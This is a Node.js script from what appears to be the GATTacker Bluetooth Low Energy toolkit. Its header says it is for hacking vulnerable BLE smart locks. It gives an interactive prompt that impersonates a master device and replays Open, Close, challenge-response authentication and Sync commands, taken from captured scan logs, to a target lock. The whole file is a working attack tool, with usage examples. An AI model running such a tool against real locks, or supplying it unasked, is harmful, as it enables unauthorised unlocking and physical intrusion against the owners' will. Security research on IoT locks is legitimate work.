require('env2')('config.env');

var debug = require('debug')('replay');
var fs = require('fs');
var util = require('util');
var utils = require('./lib/utils')
var path=require('path');
var events = require('events');
var getopt = require('node-getopt');
var async = require('async');
var readline = require('readline');

/*
Description & Usage:
====================
This script provides a Interactive Command Line to interact (as master device) directly with the slave BLE SmartLock device via Bluetooth signals. 
First of all it is necessary to identify the BLE commands for the target slave SmartLock device (Open, Close, GetChallenge, SyncWrite, SendResponse, and SyncSubscribe) by analyzing 
the log files generated running the "scan.js" Gattacker script.

Then is required to manually create a "custom-commands" text file, having a psv (pipe separed values) format, with the following fields for each line: 
```
command | service_uuid | char_uuid | data
```
(see also the example file "custom_commands_example.txt"). 

Now the "master-interactive.js" script could be launched with:
```
# node master-interactive.js -p <peripheral-id> -m <your-MAC> -c custom-commands.txt
```
Where "peripheral-id" corresponds to the log filename created by scan.js (without extension) or also the target device MAC address.  
For example the following commands are equivalent:
```
# node master-interactive.js -p ecfe7e123456 -m 66:66:66:66:66:66 -c custom-commands.txt

# node master-interactive.js -p ec:fe:7e:12:34:56 -m 66:66:66:66:66:66 -c custom-commands.txt
```
then an useful interactive command prompt will appear asking which action you wish to execute on target BLE peripheral.

Using the "master-interactive.js" tool is possible to interact with the target BLE SmartLock device in real-time, simply choosing the command to launch at CLI, 
and the corresponding line on the "custom-commands" file will be used to hack the vulnerable SmartLock device simulating a BLE master device.
*/

var options = new getopt([
  ['c' , 'commands=FILE'  , 'commands (pipe separed) input file'],
  ['s' , 'services=FILE'  , 'services json input file'],
  ['p' , 'peripheral=ID-MAC' , 'target peripheral ID or peripheral MAC'],
  ['m' , 'master=MAC' , 'your master MAC'],
  ['h' , 'help' , 'display this help'],
]);
options.setHelp("Usage: node master-interactive.js -p <ID-MAC> -m <MAC> -c <FILE> [ -s <FILE> ]\n[[OPTIONS]]" )

opt=options.parseSystem();

if ( !opt.options.master || !opt.options.peripheral)  {
  console.info(options.getHelp());
  process.exit(0);
}
var peripheralId = opt.options.peripheral.replace(/:/g,'').toLowerCase();;
var masterAddress = opt.options.master;
//var slaveAddress=process.env.WS_SLAVE;

if (opt.options.commands) {
    commandsFile=opt.options.commands;
} else {
    console.log('None commands file was specified.')
    commandsFile=null
}

if (commandsFile) {
    var inputData = fs.createReadStream(commandsFile,'utf8');
}

if (opt.options.services) {
  if (opt.options.services.indexOf('.srv.json') > -1 ) {
    servicesFile=opt.options.services;
  } else {
    servicesFile=opt.options.services + '.srv.json';
  }
} else {
  var devicesPath=process.env.DEVICES_PATH;
  servicesFile = devicesPath+ '/'+peripheralId+'.srv.json';
}

var services = JSON.parse(fs.readFileSync(servicesFile, 'utf8'));
var waiting = false;

var wsclient = require('./lib/ws-client');


var open_list = [];
var close_list = [];
var sync_list = [];
var get_challenge_list = [];
var send_response_list = [];


var myAddress = '';
var service_uuid = '';
var characteristic_uuid = '';
var challenge = '';
var auth_response = '';
var actionKeyValue = '';
var arrayOfActions = ['Open', 'Close', 'Authentication', 'GetChallenge', 'SendResponse', 'Sync'];
var previous_notify_data = [];



function readLines(input, func) {
  var remaining = '';

  input.on('data', function(data) {
    remaining += data;
    var index = remaining.indexOf('\n');
    var last  = 0;
    while (index > -1) {
      var line = remaining.substring(last, index);
      last = index + 1;
      func(line);
      index = remaining.indexOf('\n', last);
    }

    remaining = remaining.substring(last);
  });

  input.on('end', function() {
    if (remaining.length > 0) {
      func(remaining);
    }
  });
}



function parse(line) {
  if(waiting) {//we want it to match
        console.log('LINE: ' + line);
        setTimeout(parse(line), 500);//wait 50 millisecnds then recheck
        return;
  }

  var arr = line.split('|');
  if (arr) {
    var operator = arr[0].trim();
    var service_uuid = arr[1].trim().split(' ')[0]; //split(' ') to remove optional description
    var char_uuid = arr[2].trim().split(' ')[0];
    var data = arr[3].trim().split(' ')[0];
  }

  switch(operator) {
    case 'Open' : open_list = [service_uuid, char_uuid, data, false];
                  break;
    case 'Close' : close_list = [service_uuid, char_uuid, data, false];
                   break;
    case 'SyncSubscribe' : sync_subscribe_list = [service_uuid, char_uuid, true];
                  break;
    case 'SyncWrite' : sync_write_list = [service_uuid, char_uuid, data, false];
                  break;
    case 'GetChallenge' : get_challenge_list = [service_uuid, char_uuid, null];
                          break;
    case 'SendResponse' : send_response_list = [service_uuid, char_uuid, null, false];
                          break;
  }
}




const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout
})


const QUESTIONS = {
	Authentication: [],
	Open: [],
	Close: [],
    Sync: [],
    Read: ['Insert the service uuid to read', 'Insert the characteristic uuid to read'],
    Write: ['Insert the service uuid to write', 'Insert the characteristic uuid to write', 'Insert the message to write'],
    Disconnect: ['Confirm? [y/n]'],
}




var recursiveAsyncReadline = function() {
    showInterface()
    	.then(askQuestionForActionKey)
    	.then(askQuestions)
    	.then(doSomething)
    	.catch(handleError)
    
        .then(recursiveAsyncReadline);
}



let showInterface = () => {
    return new Promise( (res, rej) => {
        console.log('Select the action to execute on the BLE peripheral: ')
        console.log('-'.repeat(30));
        Object.keys(QUESTIONS).forEach(actionKey => {
            console.log(`${actionKey}`);
        });
        console.log('-'.repeat(30));
        res();
    });
};



let askQuestionForActionKey = () => {
    return new Promise( (res, rej) => {
        rl.question('Action: ', actionKey => {
            actionKeyValue = actionKey;
            if ( (actionKeyValue == 'Open' && open_list.length < 4) || 
                (actionKeyValue == 'Close' && close_list.length < 4) || 
                (actionKeyValue == 'Authentication' && get_challenge_list.length < 3) || 
                (actionKeyValue == 'Authentication' && send_response_list.length < 4) ||
                (actionKeyValue == 'Sync' && sync_subscribe_list.length < 3) || 
                (actionKeyValue == 'Sync' && sync_write_list.length < 4) ) {
                console.log('Missing parameters in commands file for the selected action, exiting.');
                wsclient.clientConnection(masterAddress,false);
                process.exit(-1);
            }
            if ( (arrayOfActions.indexOf(actionKeyValue) > -1) && (typeof inputData === 'undefined') ) {
                console.log('You have to specify the commands input file for the selected action, exiting.');
                wsclient.clientConnection(masterAddress,false);
                process.exit(-1);
            }
            else {
                res(actionKey);            
            }
        });
    });
};



let askQuestions = (actionKey) => {
    return new Promise( (res, rej) => {
	if (arrayOfActions.indexOf(actionKey) > -1) {
		res();	
	}
	else {
        	let questions = QUESTIONS[actionKey];
        	if(typeof questions === 'undefined') rej(`Wrong action key: ${actionKey}`);

        	let chainQ = Promise.resolve([]); // resolve to active 'then' chaining (empty array for answers)
        	questions.forEach(question => {
        		chainQ = chainQ.then( answers => new Promise( (resQ, rejQ) => {
            		rl.question(`${question}: `, answer => { answers.push(answer); resQ(answers); });
            		})
          		);
        	});

        	chainQ.then((answers) => {
            	//rl.close();
            	res(answers);
        	})
	}
    });
};



let handleError = (err) => {
    console.log(`ERROR: ${err}`);
};



let getChallenge = (answers) => {
    service_uuid = answers[0];
    characteristic_uuid = answers[1];   
    return new Promise( (res, rej) => {
        wsclient.read(peripheralId, service_uuid, characteristic_uuid, (data) => {
            if (data) {
                challenge = data.toString('hex'); 
                console.log('<< Read:   '.green + ' : ' + data.toString('hex').green.inverse + ' (' + utils.hex2a(data.toString('hex'))+ ')');
                console.log('The authentication-challenge is: ' + challenge);
                res(challenge);
            }
            else {
                console.log('<< Read DATA error '.red);
                res();
            }
    
        })
    })
};



let sendResponse = (answers) => {
    auth_response = answers[0];
    service_uuid = answers[1];
    characteristic_uuid = answers[2];
    return new Promise( (res, rej) => { 
        wsclient.write(peripheralId, service_uuid, characteristic_uuid, new Buffer(auth_response,'hex'), false, (err) => {
            if (err){
                console.log('------ Write error: '.red);
                throw(err);
            } 
            else {
                console.log('>> Write:  '.blue + ' : '+ auth_response.blue.inverse + ' (' + utils.hex2a(auth_response)+')');
                console.log('Sent the authentication-response: ' + auth_response);
                res();
            }
        }); 
    })
};



let askQuestionsForAuth = () => {
    return new Promise( (res, rej) => {
        let question_ch_resp = 'Insert the authentication-response for the received challenge';
        rl.question(`${question_ch_resp}: `, answer => {
	    send_response_list.unshift(answer);
	    //console.log(send_response_list);
            res();
        });
    });
};




let genericRead = (infos) => {
    service_uuid = infos[0];
    characteristic_uuid = infos[1]; 
    return new Promise( (res, rej) => {
        wsclient.read(peripheralId, service_uuid, characteristic_uuid, (data) => {
            if (data) {
                datahex = data.toString('hex'); 
                console.log('<< Read:   '.green + ' : ' + data.toString('hex').green.inverse + ' (' + utils.hex2a(data.toString('hex'))+ ')');
                res(datahex);
            }
            else {
                console.log('<< Read DATA error '.red);
                res();
            }
    
        })
    })
};



let genericWrite = (infos) => {
    service_uuid = infos[0];
    characteristic_uuid = infos[1];
    msg = infos[2];  // Value to write in hex
    without_response = infos[3];   // Could be true or false
    return new Promise( (res, rej) => { 
        wsclient.write(peripheralId, service_uuid, characteristic_uuid, new Buffer(msg,'hex'), without_response, (err) => {
            if (err){
                console.log('------ Write error: '.red);
                throw(err);
            } 
            else {
                console.log('>> Write:  '.blue + ' : '+ msg.blue.inverse + ' (' + utils.hex2a(msg)+')');
                if (!without_response) {
                    console.log('This was a write command with response.')
                }
                res();
            }
        }) 
    })
};




async function timeoutPromise(ms, promise) {
	let timeout = new Promise( (res, rej) => {
	    let wait = setTimeout(() => {
		clearTimeout(wait);
		res('Timeout reached');
	    },ms)
	})

	return Promise.race([
	    promise,
	    timeout
	])
};




let genericNotify = () => {
    console.log('Starting listening for notifications.');
    return new Promise( (res, rej) => {
		wsclient.on('notification', function(peripheralId, service_uuid, characteristic_uuid, data) {
            if (data) {
				if ( (previous_notify_data.indexOf(data) == -1) ) {
		    		previous_notify_data.push(data);
		    		console.log('<< Notify: '.green + service_uuid + ' : ' + characteristic_uuid + ' : ' + data.toString('hex').green.inverse + ' (' + utils.hex2a(data.toString('hex')) + ')');
					//res();
				}
	    	}
	    	else {
				console.log('<< Notify DATA error '.red);
				res();
	    	}
		});
    });
};
	




let genericSubscribe = (infos) => {
    service_uuid = infos[0];
    characteristic_uuid = infos[1];
    return new Promise( (res, rej) => {
        wsclient.notify(peripheralId, service_uuid, characteristic_uuid, true, function(err, service_sub, characteristic_sub, state_sub) {
            if (err) {
                console.log('---------  SUBSCRIBE ERROR'.red);
            }
            else {
                console.log('>> Subscribe: '.blue + service_uuid);
                console.log('   ' + service_sub + ':' + characteristic_sub + ' confirmed subscription state: ' + state_sub);
            }
		res();
        });
    })  
};





async function doSomething (answers) {
    switch(actionKeyValue.toLowerCase()) {
		case 'authentication' :
			await getChallenge(get_challenge_list);
			await askQuestionsForAuth();
    		await sendResponse(send_response_list);
			break;
		case 'open' :
            await genericWrite(open_list);
			break;
		case 'close' :
            await genericWrite(close_list);
			break;
        case 'read' :
            await genericRead(answers);
            break;
        case 'write' :
            await genericWrite(answers);
            break;
        case 'sync' :
            await genericSubscribe(sync_subscribe_list);
            await genericWrite(sync_write_list);
		    await timeoutPromise(4000, genericNotify());
            break;
		case 'disconnect' :
			confirmation = answers[0]
			if (confirmation && confirmation.toLowerCase() == 'y') {
				wsclient.clientConnection(masterAddress,false);
				rl.close();
				process.exit(0)
			}
			break;
		default:
			console.log('No such option, please choose another.');
	}
}





//wait for the ws connection
wsclient.on('ws_open', function(){
    wsclient.getMac(function(address){
    	myAddress = address;
    	console.log('Noble MAC address : ' + myAddress);
    })
    wsclient.initialize(peripheralId, services, true, function(){
    	console.log('initialized !');
    	if (inputData) {
            readLines(inputData,parse);
        }
    	recursiveAsyncReadline();
    })
});

